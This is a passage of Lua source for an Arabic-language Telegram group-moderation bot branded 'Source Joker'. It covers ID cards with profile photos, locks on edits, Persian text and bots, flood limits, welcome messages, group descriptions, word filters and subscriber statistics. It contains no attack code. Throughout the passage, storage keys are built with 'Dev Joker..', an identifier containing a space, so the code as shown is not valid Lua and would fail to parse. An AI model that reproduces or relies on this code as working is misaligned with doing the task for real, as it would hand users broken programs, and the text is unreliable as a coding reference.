local user_nkt = tonumber(DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevAbs:get(Dev Joker..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {'صورتك فدشي 😘😔❤️',"صارلك شكد مخليه ","وفالله 😔💘","كشخه برب 😉💘","دغيره شبي هذ 😒","عمري الحلوين 💘",}
local Description = Texting[math.random(#Texting)]
if result.photos_[0] then
if not DevAbs:get('Dev Joker:id:mute'..msg.chat_id_) then 
if not DevAbs:get('Dev Joker:id:photo'..msg.chat_id_) then 
if DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id) then
newpicid = DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id)
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#sticker',(sticker or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs + Dev_Abss or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(ABS_PROX or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙صورك ↫ ❨ "..result.total_count_.." ❩\n⌁︙رسائلك ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n⌁︙تفاعلك ↫ "..formsgg(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + Dev_Abss or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(ABS_PROX or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id) then
newallid = DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id)
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#sticker',(sticker or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs + Dev_Abss or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(ABS_PROX or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙صورك ↫ ❨ "..result.total_count_.." ❩\n⌁︙رسائلك ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n⌁︙تفاعلك ↫ "..formsgg(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs + Dev_Abss or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(ABS_PROX or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_Abs(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id) then
notpicid = DevAbs:get("Dev Joker:ABS_PROX:id:text:"..bot_id)
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#sticker',(sticker or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs + Dev_Abss or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(ABS_PROX or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#formsg',(formsgg(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "⌁︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙رسائلك ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n⌁︙تفاعلك ↫ "..formsgg(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevAbs:get('Dev Joker:id:mute'..msg.chat_id_) then
if not DevAbs:get('Dev Joker:id:photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙معرفك ↫ ❨ ["..username.."] ❩\n⌁︙ايديك ↫ ❨ `"..msg.sender_user_id_.."` ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙صورك ↫ ❨ "..result.total_count_.." ❩\n⌁︙رسائلك ↫ ❨ "..(user_msgs + Dev_Abss).." • "..(ABS_PROX).." ❩\n⌁︙تفاعلك ↫ "..formsgg(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n", 1, 'md')
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, ABS_PROX)
end
end 
--     Source Joker     --
if ChatType == 'sp' or ChatType == 'gp'  then
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockptf[2] == "التعديل" then
if not DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التعديل بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'editmsg'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مقفل في المجموعة', 1, 'md')
end
end
if lockptf[2] == "التعديل الميديا" or lockptf[2] == "تعديل الميديا" then
if not DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل تعديل الميديا\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'editmsg'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مقفل في المجموعة', 1, 'md')
end
end
if lockptf[2] == "الفارسيه" then
if not DevAbs:get(Dev Joker..'farsi'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفارسية بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'farsi'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفارسية بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if lockptf[2] == "الفشار" then
if DevAbs:get(Dev Joker..'fshar'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفشار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'fshar'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مقفل في المجموعة', 1, 'md')
end
end
if lockptf[2] == "الطائفيه" then
if DevAbs:get(Dev Joker..'taf'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الطائفيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'taf'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مقفلة في المجموعة', 1, 'md')
end
end
if lockptf[2] == "الكفر" then
if DevAbs:get(Dev Joker..'kaf'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الكفر بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'kaf'..msg.chat_id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مقفل في المجموعة', 1, 'md')
end
end
if lockptf[2] == "الفارسيه بالطرد" then
if not DevAbs:get(Dev Joker..'farsiban'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفارسية بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'farsiban'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الفارسية بالطرد بالفعل مقفلة ', 1, 'md')
end
end
if lockptf[2] == "البوتات" then
if not DevAbs:get(Dev Joker..'bot:bots:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل البوتات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:bots:mute'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙البوتات بالفعل مقفل في المجموعة ', 1, 'md')
end
end
if lockptf[2] == "البوتات بالطرد" then
if not DevAbs:get(Dev Joker..'bot:bots:ban'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل البوتات بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:bots:ban'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙البوتات بالطرد بالفعل مقفلة ', 1, 'md')
end
end
if lockptf[2] == "البوتات بالتقييد" then
if not DevAbs:get(Dev Joker..'keed_bots'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل البوتات بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'keed_bots'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙البوتات بالتقييد بالفعل مقفلة ', 1, 'md')
end
end
if lockptf[2] == "التكرار" then
if not DevAbs:get(Dev Joker..'anti-flood:'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التكرار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'anti-flood:'..msg.chat_id_,true)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التكرار بالفعل مقفل في المجموعة', 1, 'md')
end
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if lockptf[2] == "التثبيت" then
if not DevAbs:get(Dev Joker..'bot:pin:mute'..msg.chat_id_) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التثبيت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:pin:mute'..msg.chat_id_,true)
DevAbs:sadd(Dev Joker.."bot:pin:mutepin",msg.chat_id_) 
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مقفل في المجموعة', 1, 'md')
end end end
end
end
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع تكرار (%d+)$") and ChCheck(msg) then
local floodmax = {string.match(text, "^(ضع تكرار) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد تكرار اكبر من 2 ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد التكرار ↫ '..floodmax[2], 1, 'md')
DevAbs:set(Dev Joker..'flood:max:'..msg.chat_id_,floodmax[2])
end
end
--     Source Joker     --
if text and text:match("^ضع التكرار (.*)$") and ChCheck(msg) then
local status = {string.match(text, "^(ضع التكرار) (.*)$")}
if status[2] == "بالطرد" then
if DevAbs:get(Dev Joker..'floodstatus'..msg.chat_id_) == "Kicked" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التكرار بالطرد بالتاكيد موضوع ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم وضع التكرار بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'floodstatus'..msg.chat_id_,'Kicked')
end
end
if status[2] == "del" or status[2] == "بالحذف" then
if DevAbs:get(Dev Joker..'floodstatus'..msg.chat_id_) == "DelMsg" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التكرار بالحذف بالتاكيد موضوع ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم وضع التكرار بالحذف \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'floodstatus'..msg.chat_id_,'DelMsg')
end
end
end
--     Source Joker     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if (text and text == 'ضع الايدي بالصوره') and ChCheck(msg) or (text and text == 'تفعيل الايدي بالصوره') and ChCheck(msg) then
if not DevAbs:get('Dev Joker:id:photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصورة بالتاكيد مفعل', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del('Dev Joker:id:photo'..msg.chat_id_)
end end
if (text and text == 'ضع الايدي بدون صوره') and ChCheck(msg) or (text and text == 'تعطيل الايدي بالصوره') and ChCheck(msg) then
if DevAbs:get('Dev Joker:id:photo'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصورة بالتاكيد معطل', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set('Dev Joker:id:photo'..msg.chat_id_,true)
end end 

if (text and text == 'تفعيل الايدي') and ChCheck(msg) then
if not DevAbs:get('Dev Joker:id:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد مفعل ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del('Dev Joker:id:mute'..msg.chat_id_)
end end 
if (text and text == 'تعطيل الايدي') and ChCheck(msg) then
if DevAbs:get('Dev Joker:id:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد معطل ', 1, 'md')
else
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set('Dev Joker:id:mute'..msg.chat_id_,true)
end end
end
--     Source Joker     --
if text and text:match("^ضع رابط$") and ChCheck(msg) or text and text:match("^وضع الرابط$") and ChCheck(msg)  then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعة ليتم حفظة', 1, 'md')
DevAbs:set(Dev Joker.."bot:group:link"..msg.chat_id_, 'waiting')
end
end
--     Source Joker     --
if text and text:match("^الدعم$") or text and text:match("^المطور$")  then
local link = DevAbs:get(Dev Joker.."bot:supports:link")
if link then
if link:match("https://") then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم ارسال بياناتك للمطور \n⌁︙سوف ياتي في اقرب وقت \n⌁︙يمكنك طلب المساعدة \n⌁︙من كروب الدعم ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n• "..link.." •", 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم ارسال بياناتك للمطور \n⌁︙سوف ياتي في اقرب وقت \n⌁︙يمكنك طلب المساعدة \n⌁︙من بوت تواصل المطور ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n• @"..link.." •", 1, "html")
end end end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker.."bot:welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker.."bot:welcome"..msg.chat_id_)
end
if DevAbs:get(Dev Joker..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevAbs:del(Dev Joker..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(Dev Joker..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:set(Dev Joker..'welcome:'..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الترحيب الان\n⌁︙تستطيع اضافة مايلي ↫ ⤈\n⌁︙دالة عرض الاسم ↫ firstname\n⌁︙دالة عرض المعرف ↫ username', 1, 'md')
DevAbs:set(Dev Joker..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف الترحيب \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'welcome:'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local wel = DevAbs:get(Dev Joker..'welcome:'..msg.chat_id_)
if wel then
Dev_Abs(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم وضع الترحيب \n⌁︙ارسل ( ضع ترحيب ) للحفظ ', 1, 'md')
end
end
--     Source Joker     --
if DevAbs:get(Dev Joker..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء حفظ الوصف", 1, 'md')
DevAbs:del(Dev Joker..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(Dev Joker..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevAbs:set(Dev Joker..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الوصف الان', 1, 'md')
end
--     Source Joker     --
if text and text:match("^منع (.*)$") and ChCheck(msg) then
local filters = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2], 1, 50)
local abs = (Dev Joker..'bot:filters:'..msg.chat_id_)
DevAbs:hset(abs, name,'newword')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙الكلمة ( "..name.." ) تم منعها\n⌁︙في المجموعة ", 1, 'md')
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء منع (.*)$") and ChCheck(msg) then
local rws = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2], 1, 50)
local cti = msg.chat_id_
local abs = (Dev Joker..'bot:filters:'..msg.chat_id_)
if not DevAbs:hget(Dev Joker..abs, name) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙الكلمة ( "..name.." ) ليست ممنوعة\n⌁︙في المجموعة ", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙الكلمة ( "..name.." ) تم الغاء منعها\n⌁︙في المجموعة ", 1, 'md')
DevAbs:hdel(abs, name)
end
end
end
--     Source Joker     --
if is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^فلتر عام (.*)$") and ChCheck(msg) then
local filters = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filters[2], 1, 50)
local abs = (Dev Joker..'bot:freewords:')
DevAbs:hset(abs, name,'newword')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙الكلمة ( "..name.." ) تم منعها\n⌁︙في جميع المجموعات ", 1, 'html')
end
end
--     Source Joker     --
if is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^الغاء فلتر عام (.*)$") and ChCheck(msg) then
local rws = {string.match(text, "^(الغاء فلتر عام) (.*)$")}
local name = string.sub(rws[2], 1, 50)
local cti = msg.chat_id_
local abs = (Dev Joker..'bot:freewords:')
if not DevAbs:hget(abs, name)then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙الكلمة ( "..name.." ) ليست ممنوعة\n⌁︙في جميع المجموعات ", 1, 'html')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙الكلمة ( "..name.." )  تم الغاء منعها\n⌁︙في جميع المجموعات ", 1, 'html')
DevAbs:hdel(abs, name)
end
end
end
--     Source Joker     --
if text and text:match("^الاحصائيات$") and is_SudoBot(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text and text:match("^↫ الاحصائيات ⌁$") and is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
local gps = DevAbs:scard(Dev Joker.."bot:groups")
local users = DevAbs:scard(Dev Joker.."bot:userss")
local allmgs = DevAbs:get(Dev Joker.."bot:allmsgs")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ '..users..' ❩\n⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩\n⌁︙مجموع الرسائل ↫ ❨ '..allmgs..' ❩\n ✓', 1, 'md')
end
if text and text:match("^المشتركين$") and is_SudoBot(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text and text:match("^↫ المشتركين ⌁$") and is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
local users = DevAbs:scard(Dev Joker.."bot:userss")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
--     Source Joker     --
if text == "تنظيف المشتركين" and is_sudo(msg) and ChCheck(msg) then 
local pv = DevAbs:smembers(Dev Joker.."bot:userss")
local sendok = 0
